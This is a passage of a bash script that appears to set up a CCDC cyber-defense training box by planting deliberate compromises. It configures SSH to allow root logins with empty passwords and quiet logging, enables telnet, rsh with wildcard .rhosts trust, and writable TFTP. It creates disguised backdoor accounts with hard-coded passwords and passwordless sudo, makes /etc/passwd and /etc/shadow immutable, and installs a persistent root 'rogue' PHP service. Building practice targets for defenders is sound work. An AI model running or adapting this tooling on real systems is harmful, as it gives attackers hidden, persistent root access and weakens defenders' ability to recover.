            RA_PKG_UPDATE="dnf check-update -y || true"
            INETD_PKG="xinetd"; INETD_CONF="/etc/xinetd.d"; INETD_SVC="xinetd"
            TELNET_PKG="telnet-server"; RSH_PKG="rsh-server"; TFTP_PKG="tftp-server"
            SHELLINABOX_SVC="shellinaboxd"; SHELLINABOX_CONF="/etc/sysconfig/shellinaboxd"
            SSH_SVC="sshd"; SFTP_SERVER="/usr/libexec/openssh/sftp-server"
            ;;
        centos|rhel)
            if command -v dnf &>/dev/null; then
                RA_PKG_INSTALL="dnf install -y"; RA_PKG_UPDATE="dnf check-update -y || true"
            else
                RA_PKG_INSTALL="yum install -y"; RA_PKG_UPDATE="yum check-update -y || true"
            fi
            INETD_PKG="xinetd"; INETD_CONF="/etc/xinetd.d"; INETD_SVC="xinetd"
            TELNET_PKG="telnet-server"; RSH_PKG="rsh-server"; TFTP_PKG="tftp-server"
            SHELLINABOX_SVC="shellinaboxd"; SHELLINABOX_CONF="/etc/sysconfig/shellinaboxd"
            SSH_SVC="sshd"; SFTP_SERVER="/usr/libexec/openssh/sftp-server"
            EPEL_NEEDED=true
            ;;
    esac

    info "Updating package lists..."
    eval "$RA_PKG_UPDATE" || true

    # EPEL for CentOS/RHEL
    if $EPEL_NEEDED && ! rpm -q epel-release &>/dev/null 2>&1; then
        info "Installing EPEL repository..."
        $RA_PKG_INSTALL epel-release || true
    fi

    # ── OpenSSH ──────────────────────────────────────────────────────────────
    info "Configuring OpenSSH with permissive settings..."
    $RA_PKG_INSTALL openssh-server || true
    [[ -f /etc/ssh/sshd_config.bak ]] || cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
    cat > /etc/ssh/sshd_config << 'SSHEOF'
# SSH Configuration
Port 22
AddressFamily any
ListenAddress 0.0.0.0

PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
ChallengeResponseAuthentication no
UsePAM no
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys

MaxAuthTries 100
LoginGraceTime 120
MaxSessions 50

X11Forwarding yes
AllowTcpForwarding yes
GatewayPorts yes
PermitTunnel yes

LogLevel QUIET
PrintLastLog no
PrintMotd no
AcceptEnv LANG LC_*
SSHEOF
    echo "Subsystem sftp $SFTP_SERVER" >> /etc/ssh/sshd_config
    systemctl enable --now "$SSH_SVC"
    systemctl restart "$SSH_SVC"
    if systemctl is-active --quiet "$SSH_SVC"; then
        success "SSH running on port $SSH_PORT (root login enabled, empty passwords allowed)"
    else
        warn "SSH may not have started — check: journalctl -u $SSH_SVC -n 30"
    fi
    echo

    # ── Telnet ────────────────────────────────────────────────────────────────
    info "Installing Telnet server (cleartext remote shell)..."
    $RA_PKG_INSTALL "$INETD_PKG" "$TELNET_PKG" || true
    case "$OS" in
        ubuntu|debian)
            grep -q "telnetd"  "$INETD_CONF" 2>/dev/null || \
                echo "telnet  stream tcp  nowait root /usr/sbin/in.telnetd in.telnetd" >> "$INETD_CONF"
            grep -q "telnet6" "$INETD_CONF" 2>/dev/null || \
                echo "telnet  stream tcp6 nowait root /usr/sbin/in.telnetd in.telnetd" >> "$INETD_CONF"
            ;;
        fedora|centos|rhel)
            cat > /etc/xinetd.d/telnet << 'TELNETEOF'
service telnet
{
    flags           = REUSE
    socket_type     = stream
    wait            = no
    user            = root
    server          = /usr/sbin/in.telnetd
    log_on_failure  += USERID
    disable         = no
}
TELNETEOF
            ;;
    esac
    systemctl enable --now "$INETD_SVC" 2>/dev/null || true
    systemctl restart "$INETD_SVC" || true
    success "Telnet configured on port 23 (inetd/xinetd)"
    echo

    # ── Cockpit ───────────────────────────────────────────────────────────────
    info "Installing Cockpit web management interface..."
    case "$OS" in
        ubuntu|debian) $RA_PKG_INSTALL cockpit || true ;;
        fedora|centos|rhel) $RA_PKG_INSTALL cockpit cockpit-dashboard cockpit-packagekit || true ;;
    esac
    mkdir -p /etc/cockpit
    cat > /etc/cockpit/cockpit.conf << 'COCKPITEOF'
[WebService]
Origins = *
LoginTo = false
ProtocolHeader = X-Forwarded-Proto
AllowUnencrypted = true

[Session]
IdleTimeout = 0
Banner =
COCKPITEOF
    echo "" > /etc/cockpit/disallowed-users
    systemctl enable --now cockpit.socket
    systemctl enable cockpit 2>/dev/null || true
    systemctl start cockpit 2>/dev/null || true
    if systemctl is-active --quiet cockpit.socket || systemctl is-active --quiet cockpit; then
        success "Cockpit running on https://localhost:${COCKPIT_PORT} (root login allowed, no timeout)"
    else
        warn "Cockpit socket not active — check: journalctl -u cockpit.socket -n 30"
    fi
    echo

    # ── Shellinabox ───────────────────────────────────────────────────────────
    info "Installing Shellinabox (browser-accessible terminal)..."
    $RA_PKG_INSTALL "$SHELLINABOX_PKG" || true
    if ! command -v shellinaboxd &>/dev/null; then
        warn "Shellinabox binary not found — package may not be available on this distro. Skipping."
    else
        cat > "$SHELLINABOX_CONF" <<SHELLEOF
SHELLINABOX_DAEMON_START=1
SHELLINABOX_PORT=${SHELLINABOX_PORT}
SHELLINABOX_ARGS="--no-beep --disable-ssl --port=${SHELLINABOX_PORT} --user=root --group=root"
SHELLEOF
        systemctl enable --now "$SHELLINABOX_SVC" || true
        systemctl restart "$SHELLINABOX_SVC" || true
        sleep 1
        if systemctl is-active --quiet "$SHELLINABOX_SVC" 2>/dev/null; then
            success "Shellinabox running on http://localhost:${SHELLINABOX_PORT} (no SSL, root access)"
        else
            warn "Shellinabox not active — may need manual start"
        fi
    fi
    echo

    # ── RSH / RLOGIN ──────────────────────────────────────────────────────────
    info "Installing RSH/RLOGIN (BSD r-commands with hosts.equiv bypass)..."
    $RA_PKG_INSTALL "$INETD_PKG" "$RSH_PKG" || true
    case "$OS" in
        ubuntu|debian)
            grep -q "in.rshd"   "$INETD_CONF" 2>/dev/null || \
                echo "shell  stream tcp  nowait root /usr/sbin/in.rshd  in.rshd"   >> "$INETD_CONF"
            grep -q "in.rlogind" "$INETD_CONF" 2>/dev/null || \
                echo "login  stream tcp  nowait root /usr/sbin/in.rlogind in.rlogind" >> "$INETD_CONF"
            ;;
        fedora|centos|rhel)
            cat > /etc/xinetd.d/rsh << 'RSHEOF'
service shell
{
    socket_type     = stream
    wait            = no
    user            = root
    log_on_success  -= PID HOST DURATION
    log_on_failure  -= HOST
    server          = /usr/sbin/in.rshd
    disable         = no
}
RSHEOF
            cat > /etc/xinetd.d/rlogin << 'RLOGINEOF'
service login
{
    socket_type     = stream
    wait            = no
    user            = root
    log_on_success  -= PID HOST DURATION
    log_on_failure  -= HOST
    server          = /usr/sbin/in.rlogind
    disable         = no
}
RLOGINEOF
            ;;
    esac
    echo "+" > /etc/hosts.equiv;  chmod 644 /etc/hosts.equiv
    mkdir -p /root; echo "+ +" > /root/.rhosts; chmod 600 /root/.rhosts
    systemctl enable --now "$INETD_SVC" 2>/dev/null || true
    systemctl restart "$INETD_SVC" || true
    success "RSH/RLOGIN configured — /etc/hosts.equiv='+', /root/.rhosts='+ +'"
    echo

    # ── TFTP ──────────────────────────────────────────────────────────────────
    info "Installing TFTP server (no authentication, write-enabled)..."
    $RA_PKG_INSTALL "$TFTP_PKG" || true
    mkdir -p "$TFTP_ROOT"; chmod 777 "$TFTP_ROOT"
    echo "TFTP server — file transfer enabled" > "$TFTP_ROOT/README.txt"
    chmod 644 "$TFTP_ROOT/README.txt"
    case "$OS" in
        ubuntu|debian)
            cat > /etc/default/tftpd-hpa <<TFTPEOF
TFTP_USERNAME="tftp"
TFTP_DIRECTORY="${TFTP_ROOT}"
TFTP_ADDRESS="0.0.0.0:69"
TFTP_OPTIONS="--secure --create --verbose"
TFTPEOF
            systemctl enable --now tftpd-hpa; systemctl restart tftpd-hpa
            systemctl is-active --quiet tftpd-hpa && \
                success "TFTP (tftpd-hpa) running on UDP 69 — write-enabled at $TFTP_ROOT" || \
                warn "TFTP not active — check: journalctl -u tftpd-hpa -n 20"
            ;;
        fedora|centos|rhel)
            cat > /etc/xinetd.d/tftp <<TFTPEOF
service tftp
{
    socket_type     = dgram
    protocol        = udp
    wait            = yes
    user            = root
    server          = /usr/sbin/in.tftpd
    server_args     = -s ${TFTP_ROOT} -c
    disable         = no
    per_source      = 11
    cps             = 100 2
    flags           = IPv4
}
TFTPEOF
            systemctl enable --now "$INETD_SVC" 2>/dev/null || true
            systemctl restart "$INETD_SVC" || true
            success "TFTP configured via xinetd on UDP 69 — write-enabled at $TFTP_ROOT"
            ;;
    esac

    local IP
    IP=$(hostname -I 2>/dev/null | awk '{print $1}')
    [[ -n "$IP" ]] || IP="127.0.0.1"

    echo
    echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║     INTENTIONAL MISCONFIGURATIONS INSTALLED — CCDC TRAINING  ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${YELLOW}  Target IP:${NC} ${IP}"
    echo
    echo -e "${CYAN}  Service         Port     Protocol    Weakness${NC}"
    echo    "  ─────────────────────────────────────────────────────────────"
    echo -e "  OpenSSH          22       TCP         Root login, empty passwords, no PAM"
    echo -e "  Telnet           23       TCP         Cleartext, root shell, no encryption"
    echo -e "  Cockpit          9090     HTTPS       All origins, root login, no timeout"
    echo -e "  Shellinabox      4200     HTTP        Browser terminal, no SSL, root access"
    echo -e "  RSH/RLOGIN       513/514  TCP         hosts.equiv '+', .rhosts '+ +'"
    echo -e "  TFTP             69       UDP         No auth, file write enabled"
    echo
    echo -e "${YELLOW}  Access:${NC}"
    echo    "    SSH:         ssh root@${IP}  (any password, including empty)"
    echo    "    Cockpit:     https://${IP}:9090"
    echo    "    Shellinabox: http://${IP}:4200"
    echo    "    Telnet:      telnet ${IP}"
    echo    "    RSH:         rsh -l root ${IP}"
}

# =============================================================================
# SECTION 8 — Users: HomeIntruders
# =============================================================================
section_8_users() {
    section_hdr "8/9 — Users: HomeIntruders — Backdoor sudo accounts + immutable passwd"

    local -a EVIL_USERS=(
        "landscape:Gr0undzer0#"
        "nagios:Bl4ckH4t@2025"
        "systemd-oom:K3rn3lP4n1c$"
    )
    local USER_SHELL="/bin/bash"
    local entry USERNAME PASSWORD SUDOERS_FILE

    info "Creating backdoor training users..."
    echo

    for entry in "${EVIL_USERS[@]}"; do
        USERNAME="${entry%%:*}"
        PASSWORD="${entry##*:}"

        if id "${USERNAME}" &>/dev/null; then
            warn "User '${USERNAME}' already exists — skipping creation."
        else
            useradd --create-home --shell "${USER_SHELL}" "${USERNAME}"
            success "Created user: ${USERNAME}"
        fi

        echo "${USERNAME}:${PASSWORD}" | chpasswd
        success "Password set for: ${USERNAME}"

        usermod -aG "${SUDO_GROUP}" "${USERNAME}"
        success "Added '${USERNAME}' to group '${SUDO_GROUP}'"

        SUDOERS_FILE="/etc/sudoers.d/99-${USERNAME}"
        echo "${USERNAME} ALL=(ALL:ALL) NOPASSWD: ALL" > "${SUDOERS_FILE}"
        chmod 440 "${SUDOERS_FILE}"
        success "Sudoers drop-in written: ${SUDOERS_FILE}"
        echo
    done

    info "Setting immutable flag on /etc/passwd, /etc/shadow, and sudoers.d entries..."
    chattr +i /etc/passwd
    success "chattr +i applied to: /etc/passwd"
    chattr +i /etc/shadow
    success "chattr +i applied to: /etc/shadow"

    for entry in "${EVIL_USERS[@]}"; do
        USERNAME="${entry%%:*}"
        SUDOERS_FILE="/etc/sudoers.d/99-${USERNAME}"
        chattr +i "${SUDOERS_FILE}"
        success "chattr +i applied to: ${SUDOERS_FILE}"
    done
}

# =============================================================================
# SECTION 9 — WebShell: OopsAllWebShells
# =============================================================================
section_9_webshell() {
    section_hdr "9/9 — WebShell: OopsAllWebShells — php-session-mgr PHP on port 8743"

    local SERVICE_NAME="php-session-mgr"
    local SERVE_PORT="8743"
    local WEB_ROOT="/opt/${SERVICE_NAME}/www"
    local SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
    local PHP_INDEX="${WEB_ROOT}/index.php"
    local ROUTER_SCRIPT="/opt/${SERVICE_NAME}/router.php"

    info "Installing PHP CLI..."
    eval "$PKG_INSTALL php-cli" > /dev/null 2>&1

    local PHP_BIN
    PHP_BIN="$(command -v php)"
    success "PHP installed: ${PHP_BIN} ($(${PHP_BIN} -r 'echo PHP_VERSION;'))"

    info "Creating web root at ${WEB_ROOT}..."
    mkdir -p "${WEB_ROOT}"
    success "Web root created: ${WEB_ROOT}"

    info "Writing index.php..."
    cat > "${PHP_INDEX}" <<'PHPEOF'
<?php
$hostname = gethostname();
$ip       = $_SERVER['SERVER_ADDR'] ?? 'unknown';
$port     = $_SERVER['SERVER_PORT'] ?? 'unknown';
$ts       = date('Y-m-d H:i:s T');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>php-session-mgr</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #0d0d0d; color: #ff3333;
      font-family: 'Courier New', Courier, monospace;
      display: flex; flex-direction: column; align-items: center;
      justify-content: center; min-height: 100vh; text-align: center; padding: 2rem;
    }
    h1 {
      font-size: clamp(2.5rem, 8vw, 6rem); letter-spacing: 0.05em;
      text-shadow: 0 0 20px #ff0000, 0 0 60px #ff000066;
      animation: pulse 2s ease-in-out infinite;
    }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
    .subtitle { margin-top: 1.5rem; font-size: 1.1rem; color: #ff6666; opacity: 0.8; }
    .meta {
      margin-top: 3rem; font-size: 0.75rem; color: #555; line-height: 1.8;
      border-top: 1px solid #222; padding-top: 1.5rem;
    }
    .meta span { color: #ff4444; }
  </style>
</head>
<body>
  <h1>GET RID OF ME!</h1>
  <p class="subtitle">Wow! You found a rogue service. Now take it down. This is an evil service that picks a number 1-100 every second and if it picks 67 your computer will be destroyed! <3</p>
  <div class="meta">
    <span>service:</span> php-session-mgr &nbsp;|&nbsp;
    <span>host:</span> <?= htmlspecialchars($hostname) ?> &nbsp;|&nbsp;
    <span>port:</span> <?= htmlspecialchars($port) ?><br>
    <span>running as:</span> <?= htmlspecialchars(posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') ?> &nbsp;|&nbsp;
    <span>pid:</span> <?= getmypid() ?> &nbsp;|&nbsp;
    <span>time:</span> <?= htmlspecialchars($ts) ?>
  </div>
</body>
</html>
PHPEOF
    success "index.php written: ${PHP_INDEX}"

    cat > "${ROUTER_SCRIPT}" <<'ROUTEREOF'
<?php
$requested = __DIR__ . '/www' . parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
if (is_file($requested)) { return false; }
require __DIR__ . '/www/index.php';
ROUTEREOF
    success "Router script written: ${ROUTER_SCRIPT}"

    info "Writing systemd service unit: ${SERVICE_FILE}..."
    cat > "${SERVICE_FILE}" <<EOF
[Unit]
Description=php-session-mgr - network session management daemon
Documentation=https://example.com
After=network.target
Wants=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/${SERVICE_NAME}
ExecStart=${PHP_BIN} -S 0.0.0.0:${SERVE_PORT} router.php
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=${SERVICE_NAME}

[Install]
WantedBy=multi-user.target
EOF
    chmod 644 "${SERVICE_FILE}"
    success "Service unit written: ${SERVICE_FILE}"

    info "Reloading systemd daemon..."
    systemctl daemon-reload
    info "Enabling ${SERVICE_NAME}..."
    systemctl enable "${SERVICE_NAME}"
    info "Starting ${SERVICE_NAME}..."
    systemctl start "${SERVICE_NAME}"

    sleep 1
    if systemctl is-active --quiet "${SERVICE_NAME}"; then
        success "Service is running!"
    else
        err "Service failed to start. Check: journalctl -u ${SERVICE_NAME} -n 30"
        return 1
    fi

    echo
    warn "========== WEB SHELL INJECTION COMPLETE =========="
    echo
    echo -e "  ${YELLOW}Service name:${NC}    ${SERVICE_NAME}"
    echo -e "  ${YELLOW}Listening on:${NC}    http://0.0.0.0:${SERVE_PORT}"
    echo -e "  ${YELLOW}Running as:${NC}      root"
    echo -e "  ${YELLOW}Web root:${NC}        ${WEB_ROOT}"
    echo -e "  ${YELLOW}Enabled:${NC}         yes (survives reboot)"
    echo
    echo -e "  ${YELLOW}Verify it's live:${NC}"
    echo    "    curl http://localhost:${SERVE_PORT}"
    echo    "    ss -tlnp | grep ${SERVE_PORT}"
}

# =============================================================================
# MENU + MAIN LOOP
# =============================================================================
_menu_label() {
    case "$1" in
        1) echo "ATD: ComeATmeBro" ;;
        2) echo "BeeMovie: OopsAllBees" ;;
        3) echo "CronJobs: ImGonnaCron" ;;
        4) echo "LD_PRELOAD: LoadsOfIssues" ;;
        5) echo "PAM: ExWifeNamedPAM" ;;
        7) echo "RemoteAccess: OpenDoorPolicy" ;;
        8) echo "Users: HomeIntruders" ;;
        9) echo "WebShell: OopsAllWebShells" ;;
    esac
}

draw_menu() {
    clear
    echo
    echo -e "${CYAN}///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\${NC}"
    echo -e "${CYAN}  CCDC Linux Combined Setup — Interactive Menu${NC}"
    echo -e "${CYAN}///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\${NC}"
    echo -e "  OS: ${OS_PRETTY}  |  Pkg: ${PKG_MGR}"
    echo
    local i label
    for i in 1 2 3 4 5 7 8 9; do
        label="$(_menu_label "$i")"
        if is_done "$i"; then
            echo -e "  ${GREEN}[$i] [DONE] $label${NC}"
        else
            echo -e "  ${CYAN}[$i] [ -- ] $label${NC}"
        fi
    done
    echo
    echo -e "  ${YELLOW}[a]${NC} Run all (skip done)   ${YELLOW}[x]${NC} Clear state   ${YELLOW}[q]${NC} Quit"
    echo
}

run_section() {
    local n="$1"; local fn="$2"; shift 2
    echo
    if ( "$fn" "$@" ); then
        mark_done "$n"
        echo
        success "Section $n complete — marked [DONE]."
    else
        echo
        err "Section $n failed — NOT marked as done."
    fi
    echo
    read -rp "  Press Enter to return to menu..." _press_enter || true
}


main() {
    local choice payload_path

    while true; do
        draw_menu
        read -rp "  Choice: " choice || { echo; exit 0; }
        case "$choice" in
            1) run_section 1 section_1_atd ;;
            2) run_section 2 section_2_beemovie ;;
            3) run_section 3 section_3_cronjobs ;;
            4) run_section 4 section_4_ldpreload ;;
            5) run_section 5 section_5_pam ;;
            7) run_section 7 section_7_remoteaccess ;;
            8) run_section 8 section_8_users ;;
            9) run_section 9 section_9_webshell ;;
            a|A)
                local i
                for i in 1 2 3 4 5 7 8 9; do
                    if is_done "$i"; then
                        info "Section $i ($(_menu_label "$i")) already done — skipping."
                        continue
                    fi
                    case "$i" in
                        1) run_section 1 section_1_atd ;;
                        2) run_section 2 section_2_beemovie ;;
                        3) run_section 3 section_3_cronjobs ;;
                        4) run_section 4 section_4_ldpreload ;;
                        5) run_section 5 section_5_pam ;;
                        7) run_section 7 section_7_remoteaccess ;;
                        8) run_section 8 section_8_users ;;
                        9) run_section 9 section_9_webshell ;;
                    esac
                done
                echo
                success "All sections processed."
                read -rp "  Press Enter to return to menu..." _press_enter || true
                ;;
            x|X)
                rm -f "$STATE_FILE"
                success "State cleared — all sections reset to [ -- ]."
                sleep 1
                ;;
            q|Q)
                echo
                info "Goodbye."
                exit 0
                ;;
            *)
                warn "Unknown choice: '$choice'"
                sleep 1
                ;;
        esac
    done
}

main "$@"
